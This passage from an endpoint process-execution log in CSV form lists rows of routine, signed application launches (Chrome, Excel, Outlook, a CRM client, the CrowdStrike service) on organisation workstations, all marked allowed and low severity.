P00451,2026-09-12 15:57:45,WKST-SWK-002,nduminga,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",d80d33a61cee9e5615f31267b4f5b6a447bf4190eb80f8e528105c15899e8af7,signed,ALLOWED,Low
P00452,2026-09-12 16:02:02,WKST-EXE-002,shapaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3ee71b1ab872991db22bfc4826655c06b8953973e9b2a63436ef12348400c29e,signed,ALLOWED,Low
P00453,2026-09-12 16:02:48,WKST-SWK-012,nambala,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",87641e83fb8e777800d5943133636222bf9e7bf72ccf9f10b43d8c03f0440ea5,signed,ALLOWED,Low
P00454,2026-09-12 16:10:29,WKST-OND-004,ndjaba,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",eb7c00ef28c61c6fe70358c3be0f40599fdb466ffe0a6f55ad8f78ac9d4b6cc2,signed,ALLOWED,Low
P00455,2026-09-12 16:17:06,WKST-SOC-003,haufiku,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",75f62db212c3fa00c04ae9401ecf5419c258ab0caada8673251669b5ee547b3a,signed,ALLOWED,Low
P00456,2026-09-12 16:18:13,WKST-CMP-009,kndjavera,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,26214642335d90b51568370295ea714f619558c9e3c732cccc1de91e4c4004f3,signed,ALLOWED,Low
P00457,2026-09-12 16:24:45,WKST-TRY-007,hamukwaya,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",419ff7fde8cfd4e5c2b17b0deac76d863e40c73c4cffb3dac84450036e0cef72,signed,ALLOWED,Low
P00458,2026-09-12 16:25:50,WKST-CMP-003,amupanda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",f6e7ddfc0b270c694865ce56468b1412beeb4f19e0eb18d28696ef4966b75be8,signed,ALLOWED,Low
P00459,2026-09-12 16:29:36,WKST-CS-006,nnakale,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",cefe1df794ec860e789dbe9f3f1ef7bca558f88fc37f63952361e82379c6c324,signed,ALLOWED,Low
P00460,2026-09-12 16:41:21,WKST-SWK-008,sihuhua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,6c2416b44667a52d17991422ee108fe3f8f488a0ab96c48600abd971586c0ad3,signed,ALLOWED,Low
P00461,2026-09-12 16:53:09,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",48e55cc53187daf6214c036e36cd9915b42c5ec50733431d801863aa4c436347,signed,ALLOWED,Low
P00462,2026-09-12 16:57:36,WKST-CS-017,mhaingura,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",fe92e2ddf15abe4dab77ad4ade5df1c13398ffc7d43c815a21d1f1f25a566334,signed,ALLOWED,Low
P00463,2026-09-12 17:00:25,WKST-CS-006,nnakale,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",9bdb439936d1519105066c6f6f56f368ff679a311d79986f8714bff3b23ab199,signed,ALLOWED,Low
P00464,2026-09-12 17:03:41,WKST-HR-002,pnakale,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",8eebc945d3f355d6be5a38065d150dd92dfa044da3f7743551d7d4a885ad53dd,signed,ALLOWED,Low
P00465,2026-09-12 17:05:28,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",2177f31a348ac7790fc186bb9ba27480d582f3ece3a93dce5963ce2c4b724af0,signed,ALLOWED,Low
P00466,2026-09-12 17:18:16,WKST-IT-005,nghifindaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",ed6361fb96bc3167f0ed65bcec47df61a5788bccca4790403b258d96f866d854,signed,ALLOWED,Low
P00467,2026-09-12 17:23:56,WKST-CMP-003,amupanda,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,c6bcbb73d21b0bafe65aafcddf357e1119c92bd7d0be65e81a3ecd2a76ff180d,signed,ALLOWED,Low
P00468,2026-09-12 17:27:04,WKST-HR-002,pnakale,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",5a660bb84bb5c35214e922a18e91a5402e0625febf7d192ecbac34a07dc636b7,signed,ALLOWED,Low
P00469,2026-09-12 17:31:00,WKST-SWK-002,nduminga,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",951f48d4bcef66278aebddf95985d54d68bd207cf19cccfe28f00f501501dd7e,signed,ALLOWED,Low
P00470,2026-09-12 17:32:05,WKST-IT-012,katjiuongua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",34ec22636d5ea711b41e25c956b200ea8f5faa56d1c6fa9244d4bbe6ad95f4fb,signed,ALLOWED,Low
P00471,2026-09-12 18:14:07,WKST-HR-002,pnakale,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",83d6c757905c60818fd87949a3d62984da1d659d6385032d27f3bda052b4a4a0,signed,ALLOWED,Low
P00472,2026-09-12 18:14:40,WKST-LOAN-018,shilongo,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,f31923206de3c5459ccb98e92d3d3b2994ae17487d42d823b5fe3fff0d94e9d8,signed,ALLOWED,Low
P00473,2026-09-12 18:34:36,WKST-EXE-002,shapaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",6a61c0e61f9ade6caa40c358b861134d06bdbad26c0d685f2c7223743c128d67,signed,ALLOWED,Low
P00474,2026-09-12 18:37:18,WKST-OND-004,ndjaba,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",f49f08413c9b63aa4e51f109331e0da3adcaae1e224c4f7da4be4eef44ddde3d,signed,ALLOWED,Low
P00475,2026-09-12 18:39:23,WKST-HR-014,mukwambi,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",763f7d83163dfe7710bea9d1f60cd6eeda868791c4d4aead0d8911b5372e0cbd,signed,ALLOWED,Low
P00476,2026-09-12 19:00:04,WKST-TRY-007,hamukwaya,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,5f1e2d656968913ef72cec6a6955dd691c3127b8e216ebe586e0c2ce4604dcd1,signed,ALLOWED,Low
P00477,2026-09-12 19:01:46,WKST-HR-002,pnakale,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",88a889d54f6f92485357ba5446fee3ddc69c5c9260c9453d84108e128958359a,signed,ALLOWED,Low
P00478,2026-09-12 19:07:11,WKST-SWK-002,nduminga,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,55f123d6c4f253d33b6d9b00ada9005a81cf32dd0813a69fd1d3a82f34725507,signed,ALLOWED,Low
P00479,2026-09-12 19:09:37,WKST-IT-005,nghifindaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",5a413ef09c7f38cd71092cf6b36b0b04006edc0f59d9b703ef3ed926ee634ad6,signed,ALLOWED,Low
P00480,2026-09-12 19:19:37,WKST-RSK-006,murorua,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",cfbc2fc3b5f7af93eaf2226e197170f932f65cbd133299ca63225276fd6965f2,signed,ALLOWED,Low
P00481,2026-09-12 19:20:14,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",0e6d210baaffdb7fcf80c30fd4ba30a43e8f2f0b88e0e53ba432507bc4e6d721,signed,ALLOWED,Low
P00482,2026-09-12 19:20:49,WKST-FIN-021,jkavari,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",b0bd95ba031c9293c08769ae4a9a318e4be92e142a352e3eb85dc4a7a8361b2d,signed,ALLOWED,Low
P00483,2026-09-12 19:21:14,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3b892d30c2f3e415de1e9a0629dbc9a1906307915eb88855b41fbb46c64e51b3,signed,ALLOWED,Low
P00484,2026-09-12 19:24:47,WKST-EXE-002,shapaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",9267bb4d1a2cdfaaa7b8a6a9407789ca6b50c26b0c0f8cf0dad69f5395193c4a,signed,ALLOWED,Low
P00485,2026-09-12 19:26:20,WKST-FIN-021,jkavari,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,5b9b72e35f829c0c7fb06273159c3879ef5e216b0df50eddf13f87b91896f47e,signed,ALLOWED,Low
P00486,2026-09-12 19:35:31,WKST-CMP-003,amupanda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",529a063d2cc2c69c910c83b50251ecfa2a8df3842bfa979ee2943646d40f546f,signed,ALLOWED,Low
P00487,2026-09-12 19:36:26,WKST-HR-014,mukwambi,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",2f4fe59452614725d1bb90ff43c3f30bbe72e60400f4a057da94dda1acb34503,signed,ALLOWED,Low
P00488,2026-09-12 19:59:08,WKST-AUD-004,tjirera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",34926ef09571470d0144264945386e5a99ca8039544c89878b18234d4c7f1677,signed,ALLOWED,Low
P00489,2026-09-13 06:53:37,WKST-RSK-006,murorua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",de332a6d00fbc90bd697e4933775128b1e3fdef1baf92c827c89d549696c80bc,signed,ALLOWED,Low
P00490,2026-09-13 06:56:04,WKST-EXE-002,shapaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,27304965da64e7728b5529e0872100e9399bdce7de5eb6d1b835bc0a7adc8c7f,signed,ALLOWED,Low
P00491,2026-09-13 06:58:13,WKST-CS-017,mhaingura,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",b36208327ea5f29f14eb493e90b5a16476c29ff77fba6bbc46c27af17cb80f99,signed,ALLOWED,Low
P00492,2026-09-13 07:07:05,WKST-IT-012,katjiuongua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",e4fc0959270d93e5c5134e156db800c62c56553839dcc94dabb278fd158632c7,signed,ALLOWED,Low
P00493,2026-09-13 07:17:37,WKST-AUD-004,tjirera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",52a3ba84c6474bbd5061b4c0c007ad78524e2ceda7e8db351551bc92ed935819,signed,ALLOWED,Low
P00494,2026-09-13 07:49:12,WKST-CS-011,tkamati,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",d1ea123103e35a04be392d68d355e4744035279ce6b90194f6c130118d639380,signed,ALLOWED,Low
P00495,2026-09-13 07:50:26,WKST-MKT-010,ntinda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",0ae6f0f37e51f20447e930602aed91e318e7e42d2b8a6cb9580572e3310cec04,signed,ALLOWED,Low
P00496,2026-09-13 08:34:45,WKST-LGL-005,mbandeka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",36907d162622b452fed79f38ec3aae7273149e89f45c59ec37222f3641d4fede,signed,ALLOWED,Low
P00497,2026-09-13 08:53:37,WKST-HR-002,pnakale,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",8613b60c5fa1f6cbc37d1bb47a9765001fc6f3d5761ccf4ef7c7ae2d144c11bc,signed,ALLOWED,Low
P00498,2026-09-13 09:07:30,WKST-CS-006,nnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,f17d957dff3ef1282eb6a852cf5d9db07ce30195801d7b6b58fa2362564d77c0,signed,ALLOWED,Low
P00499,2026-09-13 09:15:09,WKST-CMP-003,amupanda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",817b3d17950ffd78417501e8b9fc409e057dbb4d79f99ffc4f5b598a7c95b02e,signed,ALLOWED,Low
P00500,2026-09-13 09:20:23,WKST-TRY-007,hamukwaya,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",08cb54f61599af5f4042da17a712f01352a45c1e3d3155c37c9c2ae1eae0f96c,signed,ALLOWED,Low
P00501,2026-09-13 09:33:01,WKST-AUD-004,tjirera,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c2dfb7f3a6521d94a21535f6d9d424a31d853753926c8fe91a115df2bb132dab,signed,ALLOWED,Low
P00502,2026-09-13 09:51:22,WKST-EXE-002,shapaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,170949365f6b3f31e625015e195839070f80aa015de3e7fefb9f6de409e96dba,signed,ALLOWED,Low
P00503,2026-09-13 09:52:07,WKST-LGL-005,mbandeka,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",de992c6b03d58d6a2f10864816ccbcbeeb7744b40b699aa11f35763ad45addca,signed,ALLOWED,Low
P00504,2026-09-13 09:55:02,WKST-SWK-002,nduminga,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,d23df4f44d1233e1f842aef41ebd3d409c050a21476bea0c3ff71f3503e5c072,signed,ALLOWED,Low
P00505,2026-09-13 09:58:04,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",d563ada12c1739776aa7c88a654215ff27dd06493e690330ebe02a574f2b9b70,signed,ALLOWED,Low
P00506,2026-09-13 10:07:09,WKST-OND-004,ndjaba,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",24a2d217d41b391557e4579b24115a2395e7d9278928d128eb3ebfc98f8c4b0a,signed,ALLOWED,Low
P00507,2026-09-13 10:13:42,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",a5af90a23aa24c10eaf2555f002cbb31de21fb6747af635b206cca63293fea01,signed,ALLOWED,Low
P00508,2026-09-13 10:25:48,WKST-SWK-012,nambala,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",771199639a185b1809b1727f158c6db504f1b751e272e948f575a26c2dfd559b,signed,ALLOWED,Low
P00509,2026-09-13 10:26:52,WKST-RSK-006,murorua,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",8b6722681ca46e4269732435a9e6564c02302901cacfa79db2258e00fe5cd520,signed,ALLOWED,Low
P00510,2026-09-13 10:31:50,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",6b800fafd5aee0209ee69a1116d95155467b033badd2459f91159fa6a6063961,signed,ALLOWED,Low
P00511,2026-09-13 10:32:47,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",a3585a664945e807c2fe576341917dda0b0aefe3de026388eef29b54e899b476,signed,ALLOWED,Low
P00512,2026-09-13 10:36:51,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",2012bbfd3aedcfe13f8449461fd0a5121b283e145f989dad7aaac1ceeee156ce,signed,ALLOWED,Low
P00513,2026-09-13 10:43:47,WKST-HR-002,pnakale,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",50a0db152c7d34124598694ca1f4c9c57c8f2b1bd827eab50912260e90b1325c,signed,ALLOWED,Low
P00514,2026-09-13 11:06:43,WKST-OND-004,ndjaba,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,e5a32e44fe87d5d38ff08705d503463d5a57eb2f469954349567032d708e664c,signed,ALLOWED,Low
P00515,2026-09-13 11:09:16,WKST-SWK-012,nambala,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",f626e43e742aa80c6d91120ec99a49eac6045e31e5478ec0d9fd7c829a65691a,signed,ALLOWED,Low
P00516,2026-09-13 11:11:08,WKST-CMP-009,kndjavera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",a5cc7c003f565d5bab568e607c1026a922b7d0e5c1db94cc92fc379275bcfecb,signed,ALLOWED,Low
P00517,2026-09-13 11:16:57,WKST-CMP-003,amupanda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",6207ec4574b3868be829a058d399a54bb3f1520be5ca7920f52b1bb43081e6d9,signed,ALLOWED,Low
P00518,2026-09-13 11:20:07,WKST-FIN-021,jkavari,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",37811e8aceea1c79941ad05769ac9b321aafac7abdd9aca1fe5427b9d668b01b,signed,ALLOWED,Low
P00519,2026-09-13 11:54:07,WKST-LGL-005,mbandeka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",515aabc39f4314089df7303a9658861c5dffbe2fce012922c795b566e8c30ef4,signed,ALLOWED,Low
P00520,2026-09-13 11:54:26,WKST-CS-017,mhaingura,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",e4e71556ca56574e8aa51efd0738fde22af5f24cb54c55e54ceddf6d5b6e4e34,signed,ALLOWED,Low
P00521,2026-09-13 12:08:14,WKST-HR-002,pnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",81a034b306c832890f5411e9245819347c96840639f88fca21ebe663c494ca03,signed,ALLOWED,Low
P00522,2026-09-13 12:24:09,WKST-CS-006,nnakale,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",68c4dd66409f83b3a1b707a7a6e6664bdf85c97c759e21fefe7654e5418a6085,signed,ALLOWED,Low
P00523,2026-09-13 12:26:12,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",ab04d595f80f1f4ce07f6f2a2bffdd4821c7684e04767840a499b16e9b9bebd1,signed,ALLOWED,Low
P00524,2026-09-13 12:42:51,WKST-FIN-021,jkavari,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",2211d8f3313ab252f3cf526c742428a90897f98cd3d46698f2e75351bd48288b,signed,ALLOWED,Low
P00525,2026-09-13 12:42:51,WKST-CMP-009,kndjavera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",d79db82524710f07a116b0c081256fbf0fcb57ecde2104a8b3807be1a513b57f,signed,ALLOWED,Low
P00526,2026-09-13 12:44:12,WKST-CS-017,mhaingura,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",0b1279639274e86dec71e6e9ee8b650051e8f634d1d4d8f96adbbe6bfcdc0b5f,signed,ALLOWED,Low
P00527,2026-09-13 12:58:37,WKST-SWK-012,nambala,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",a5ceb3487140a0ff31fc53c6afebe615890cb71691af379ef9e626f501b5c4f8,signed,ALLOWED,Low
P00528,2026-09-13 12:59:53,WKST-SWK-002,nduminga,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",27f689619b3cbeb7cdb409dcf4f9292414fb431610e9c1bbfe611c4979846a31,signed,ALLOWED,Low
P00529,2026-09-13 13:16:56,WKST-HR-014,mukwambi,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",99f289ad520b289125628d923e300cca3b1f7645a85cd8563abd4d52d9f61758,signed,ALLOWED,Low
P00530,2026-09-13 13:17:33,WKST-FIN-021,jkavari,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",eb6a7555bb75efd6335744e4365c01e954c73f824e06338c83824b989bca7017,signed,ALLOWED,Low
P00531,2026-09-13 13:28:52,WKST-FIN-004,tshivute,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,fc28e0b56cf9fa699039fa2bd283e793fda51eca662e27aa8c512fd69c1667ee,signed,ALLOWED,Low
P00532,2026-09-13 13:49:58,WKST-HR-002,pnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",e6b6253513dc0fa3551697f968c44d667afe34bba965dfdba81ec17e25381060,signed,ALLOWED,Low
P00533,2026-09-13 14:02:45,WKST-SOC-003,haufiku,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",50dd55b181dfaa0ca73c3e0537b787483089c5dc580ef687919db0e7a12be4cf,signed,ALLOWED,Low
P00534,2026-09-13 14:09:04,WKST-EXE-002,shapaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",d853ae889e32e8c5b051f947eaefb093e9a901e4620bc5848c999ee3ba7e884d,signed,ALLOWED,Low
P00535,2026-09-13 14:12:09,WKST-SWK-012,nambala,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",4a5c112256c240c5cd90721f86eecc5037d72b59bc2786809bbbe19ce955cd4a,signed,ALLOWED,Low
P00536,2026-09-13 14:18:06,WKST-AUD-004,tjirera,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,77774dd4f15e23315dc60451d05cc826fbed3a05779f79e3ad2b24659cf7d9dc,signed,ALLOWED,Low
P00537,2026-09-13 14:41:10,WKST-IT-012,katjiuongua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",7fad5f91b034f4cb86ae6e661889c09d44ba52ebd944ea0a353738648fe52e41,signed,ALLOWED,Low
P00538,2026-09-13 14:41:26,WKST-CS-011,tkamati,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,b88ef6f599dd2f5e577e1d1af1541a4f99eb091a6a83db4abcdf6adbb650502e,signed,ALLOWED,Low
P00539,2026-09-13 14:49:45,WKST-RSK-006,murorua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",ce88c003bf5e999ff39c92425b24eedbf8b3f26f14b4df8f7ea854b8e9363002,signed,ALLOWED,Low
P00540,2026-09-13 14:52:20,WKST-OND-004,ndjaba,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",1655d3e561e2b21ee1a52b04ef59a1542d62465042b16e80d164349c222cfa00,signed,ALLOWED,Low
P00541,2026-09-13 14:54:58,WKST-CS-017,mhaingura,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,b8d31d8ab5dd4ffab5ee94a7ce608d49ee50cf5b306e532e16fc8d02d7e70d75,signed,ALLOWED,Low
P00542,2026-09-13 14:57:59,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",77ba5401a358f69ca1ea457053d4a456b22c1a6c76be568085edcc4cd923cc3c,signed,ALLOWED,Low
P00543,2026-09-13 15:02:10,WKST-FIN-021,jkavari,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c05f5eb5df29d486595ff8ff7d5963715867530d0d2c8c67f851dae2bd364a74,signed,ALLOWED,Low
P00544,2026-09-13 15:02:24,WKST-FIN-004,tshivute,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,91f027c537c8e548c0faa7236ad79cd80c98d4f0292dd9d72e7374b502413961,signed,ALLOWED,Low
P00545,2026-09-13 15:04:26,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c4969515ea48c1ff390d952a3a6cf5b9f508144a95841dc8f3570f2150aa4253,signed,ALLOWED,Low
P00546,2026-09-13 15:32:24,WKST-MKT-010,ntinda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",ffe8f257456aef62dff5e787bbb5d2b2c11d803b6ba78848b0702d86ee21dde3,signed,ALLOWED,Low
P00547,2026-09-13 15:33:23,WKST-RSK-006,murorua,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",4b187134376afcfd628a5be38e336fec8b935fd9dd1fef2d27ee537150b49597,signed,ALLOWED,Low
P00548,2026-09-13 15:35:54,WKST-SWK-008,sihuhua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",b8f2ee0f99ac959f5bed8248c6eb0aff97b3d9db7211e393a1782839cb5adf42,signed,ALLOWED,Low
P00549,2026-09-13 15:37:17,WKST-SWK-012,nambala,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",3690f91ca318084fd2e3c99fb11b43162cd1d266e3dd581bb797755d7b45f3ff,signed,ALLOWED,Low
P00550,2026-09-13 15:39:12,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3ba4d5565020f75f7348115611bca20d49d3afb4995c4c41025947d999bca376,signed,ALLOWED,Low
P00551,2026-09-13 16:07:42,WKST-IT-005,nghifindaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",196b73f485646e71bce81cd4acb9e4d2a6b61b877e143257eba4a477beaf8832,signed,ALLOWED,Low
P00552,2026-09-13 16:08:33,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",38a8c238743c638b619f082ea2d5a993db5a1865cf11317ea529607847411010,signed,ALLOWED,Low
P00553,2026-09-13 16:29:25,WKST-CMP-003,amupanda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",3c6c43b3e1d28313078dfeddc0d887b68784a9b1e5587782390d40b3422a2bd7,signed,ALLOWED,Low
P00554,2026-09-13 16:42:18,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",905b0d120be47614354c3fef7016ef7e84f08a6b6910c27ba762849a3e4a141e,signed,ALLOWED,Low
P00555,2026-09-13 17:32:28,WKST-EXE-002,shapaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,57a91b3aba5ae174789e23bb274d8dde8089b6a6953c832ce3bf496f6acb9763,signed,ALLOWED,Low
P00556,2026-09-13 17:58:30,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",786af505af672426ac389c2af008f3cd2e532cc2734e2c4b0f4a714597292cfd,signed,ALLOWED,Low
P00557,2026-09-13 18:24:52,WKST-SWK-012,nambala,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,68ee66f2cc9938918e8268d0147b03a8b5645b57b3cfb22d21d810a4635f5482,signed,ALLOWED,Low
P00558,2026-09-13 18:28:08,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",8fdd9c15d15b2b17a2dd76d2f348fb8401d65139ffcbe80d5ffc9d93b99b31f4,signed,ALLOWED,Low
P00559,2026-09-13 18:30:37,WKST-FIN-004,tshivute,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",ea5893ce90ee825c9640ec4ae4965751fe58c95f61bb4cce9b2ef98ba34b905c,signed,ALLOWED,Low
P00560,2026-09-13 18:39:30,WKST-HR-014,mukwambi,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",9dc494c62cb0c07f28384da45774c99dc406343ed755fe160cdf8a06e5f471e3,signed,ALLOWED,Low
P00561,2026-09-13 18:45:30,WKST-SWK-008,sihuhua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",8974deea55b15d7ae5a333a6503045b7d3fed09ed144b55fd74ebbac1048e072,signed,ALLOWED,Low
P00562,2026-09-13 18:49:02,WKST-CS-011,tkamati,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,6af9e050125d093ee1f9df135d178c5eed5dc788d5e8b26611ce5359c3c8969c,signed,ALLOWED,Low
